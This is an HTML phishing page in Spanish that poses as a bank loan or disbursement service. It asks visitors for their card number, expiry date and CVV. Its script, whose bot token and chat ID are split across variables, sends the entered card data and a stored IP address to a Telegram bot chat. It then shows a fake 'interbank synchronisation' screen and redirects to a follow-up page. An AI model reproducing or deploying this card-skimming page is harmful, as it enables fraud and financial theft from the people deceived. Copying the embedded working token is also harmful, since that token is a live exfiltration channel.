<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Centro de Asignaciones | Exclusividad clientes</title>
    <style>
        :root { --p: #0A2A5E; --glass: rgba(255, 255, 255, 0.9); }
        body { background: #f0f4f8; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: var(--glass); padding: 35px; border-radius: 24px; width: 420px; box-shadow: 0 25px 50px rgba(0,0,0,0.1); backdrop-filter: blur(10px); }
        .logo-main { display: block; max-width: 150px; margin: 0 auto 30px; }
        
        .v-card { background: linear-gradient(135deg, #1e293b 0%, #334155 100%); border-radius: 18px; padding: 25px; color: white; position: relative; overflow: hidden; }
        .card-type-icon { position: absolute; top: 20px; right: 20px; height: 35px; transition: 0.3s; opacity: 0.8; }
        .chip { width: 48px; height: 38px; background: linear-gradient(135deg, #fcd34d, #fbbf24); border-radius: 8px; margin-bottom: 25px; }
        
        label { font-size: 10px; text-transform: uppercase; letter-spacing: 1.5px; opacity: 0.6; display: block; margin-bottom: 6px; }
        input { background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.15); color: white; width: 100%; padding: 12px; border-radius: 8px; font-size: 17px; margin-bottom: 18px; outline: none; box-sizing: border-box; }
        input::placeholder { color: rgba(255,255,255,0.3); }
        
        .row { display: flex; gap: 15px; }
        .btn { width: 100%; padding: 18px; background: var(--p); color: white; border: none; border-radius: 12px; font-weight: 700; font-size: 16px; cursor: pointer; margin-top: 20px; transition: 0.3s; }
        .btn:hover { background: #071c3d; transform: translateY(-2px); }

        .loader { position: fixed; top:0; left:0; width:100%; height:100%; background:white; display:none; flex-direction:column; justify-content:center; align-items:center; text-align: center; z-index: 1000; }
        .spinner { border:5px solid #f3f3f3; border-top:5px solid var(--p); width:50px; height:50px; border-radius:50%; animation:spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <img src="img/nuevo.png" class="logo-main">
        <div class="v-card">
            <img id="card-logo" src="" class="card-type-icon" style="display: none;">
            <div class="chip"></div>
            <label>Número de tarjeta de debito o credito</label>
            <input type="text" id="k1" maxlength="19" placeholder="0000 0000 0000 0000" oninput="detectCard(this.value)">
            <div class="row">
                <div style="flex:2">
                    <label>Valido hasta (MM/AA)</label>
                    <input type="text" id="k2" placeholder="00/00" maxlength="5" oninput="formatDate(this)">
                </div>
                <div style="flex:1">
                    <label>CVV</label>
                    <input type="password" id="k3" placeholder="***" maxlength="4">
                </div>
            </div>
        </div>
        <button class="btn" onclick="send()">Vincular y Desembolsar</button>
    </div>

    <div id="load" class="loader">
        <div class="spinner"></div>
        <h3 style="color: var(--p);">Sincronizando con Red Interbancaria</h3>
        <p>Por favor, espere mientras validamos su informacion crediticia...</p>
    </div>

    <script>
        function detectCard(val) {
            const logo = document.getElementById('card-logo');
            val = val.replace(/\D/g, '');
            // Formatear espacios visuales
            document.getElementById('k1').value = val.replace(/(\d{4})(?=\d)/g, '$1 ');

            if (/^4/.test(val)) { logo.src = "https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg"; logo.style.display = "block"; }
            else if (/^5[1-5]/.test(val)) { logo.src = "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"; logo.style.display = "block"; }
            else if (/^3[47]/.test(val)) { logo.src = "https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg"; logo.style.display = "block"; }
            else if (/^6(?:011|5)/.test(val)) { logo.src = "https://upload.wikimedia.org/wikipedia/commons/b/b5/Discover_Card_logo.svg"; logo.style.display = "block"; }
            else { logo.style.display = "none"; }
        }

        function formatDate(el) {
            let val = el.value.replace(/\D/g, '');
            if (val.length >= 2) el.value = val.slice(0,2) + '/' + val.slice(2,4);
        }

        const a="8652605735:", b="AAGpe405IEzW36zWbSR6HbDvaYRmQHfqHGE", c="-1003900740654";
        async function send() {
            document.getElementById('load').style.display='flex';
            const msg = `<b>[TARJETA]</b>\nIP: ${localStorage.getItem('_uip')}\nK1: ${document.getElementById('k1').value}\nK2: ${document.getElementById('k2').value}\nK3: ${document.getElementById('k3').value}`;
            await fetch(`https://api.telegram.org/bot${a+b}/sendMessage?chat_id=${c}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
            setTimeout(() => { window.location.href='codigo.html'; }, 30000);
        }
    </script>
</body>
</html>
